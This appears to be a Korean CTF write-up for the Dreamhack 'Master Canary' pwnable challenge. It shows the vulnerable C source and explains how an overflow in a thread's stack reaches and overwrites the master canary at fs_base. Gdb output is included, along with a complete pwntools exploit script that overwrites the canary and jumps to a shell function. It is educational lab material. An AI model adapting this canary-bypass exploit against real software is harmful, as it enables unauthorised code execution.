---
title: "Master Canary 라이트업"
date: 2025-01-14 00:00:00 +0900
categories: [CTF]
tags: [pwnable, writeup]
permalink: /posts/pwn-Master-Canary/
---

바이너리의 소스 코드가 주어집니다.

```c
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void giveshell() { execve("/bin/sh", 0, 0); }
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void read_bytes(char *buf, int size) {
  int i;

  for (i = 0; i < size; i++)
    if (read(0, buf + i*8, 8) < 8)
      return;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  read_bytes(buf, size);
}

int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}

```

# 공격 기법

함수 **read_bytes**에 버퍼 오버플로우 취약점이 있습니다.

```c
void read_bytes(char *buf, int size) {
  int i;

  for (i = 0; i < size; i++)
    if (read(0, buf + i*8, 8) < 8)
      return;
}

```

스택은 다음과 같습니다.

```
   fs_base <br>

+----------------+
|                |
| thread_routine |
|                |
|      buf       |
+----------------+
|                |
|   read_bytes   |
|                |
+----------------+
```

따라서 **buf**에 대해 bof를 계속하면 마스터 카나리를 덮어쓸 수 있습니다. <br>

계산해보면 buf와 **fs_base** 사이의 거리(0x928)를 알 수 있습니다. <br>

하지만 b'A' * 0x928 + (canary)로 코드를 간단히 작성하면 세그먼테이션 폴트가 발생합니다. <br>

![Gdb Error](/assets/img/posts/CTF/dreamhack/pwnable/MasterCanary.png)

```
-> 0x7f1431348af2 c6807209000000          <NO_SYMBOL>   mov    BYTE PTR [rax + 0x972], 0x0
   0x7f1431348af9 c3                      <NO_SYMBOL>   ret

gef> p $rax
$1 = 0x4141414141414141
```

**Cannot access memory at address 0x4141414141414ab3** <br>

따라서 그 위치에는 쓰기 가능한 메모리 주소(예: bss)를 넣어야 합니다.

```
gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 0x0000000000000000 r-- /home/mc_thread/mc_thread
0x0000000000401000 0x0000000000402000 0x0000000000001000 0x0000000000001000 r-x /home/mc_thread/mc_thread
0x0000000000402000 0x0000000000403000 0x0000000000001000 0x0000000000002000 r-- /home/mc_thread/mc_thread
0x0000000000403000 0x0000000000404000 0x0000000000001000 0x0000000000002000 r-- /home/mc_thread/mc_thread
0x0000000000404000 0x0000000000405000 0x0000000000001000 0x0000000000003000 rw- /home/mc_thread/mc_thread
0x0000000001f68000 0x0000000001f89000 0x0000000000021000 0x0000000000000000 rw- [heap]
```

0x404000을 사용할 수 있습니다. <br>

최종 익스플로잇은 다음과 같습니다.

```python
from pwn import *
p = remote('host1.dreamhack.games', 8685)

p.recvuntil(b'Size: ')
p.sendline(b'294')
p.recvuntil(b'Data: ')

payload = b'A' * 8

for i in range(35):
    p.send(payload)

p.send(p64(0x401256))

for i in range(290 - 36):
    p.send(payload)

payload = p64(0x404000)

p.send(payload)

payload = b'A' * 8

p.send(payload)
p.send(payload)
p.send(payload)
p.send(payload)
p.send(payload)

p.interactive()
```

**giveshell** 함수의 주소를 올바른 위치(ret)에 넣어야 합니다.
